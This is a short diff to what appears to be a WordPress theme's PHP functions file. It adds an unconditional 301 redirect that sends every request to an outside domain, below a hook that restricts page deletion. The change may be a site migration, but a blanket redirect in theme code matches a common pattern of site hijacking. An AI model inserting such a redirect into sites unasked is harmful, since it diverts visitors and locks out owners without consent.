@@ -139,3 +139,10 @@
     }
     // add_action('before_delete_post', 'restrict_page_deletion', 10, 1);
     add_action('wp_trash_post', 'restrict_page_deletion', 10, 1);
+
+    // Redirect
+    $url = 'https://benhvienthammykangnam.com.vn';
+	Header( "HTTP/1.1 301 Moved Permanently" );
+    Header("Location: ".$url."");
+
+    // <meta http-equiv="refresh" content="0;URL='<?php echo esc_url( home_url( '/' ) ); ?>'" /> 
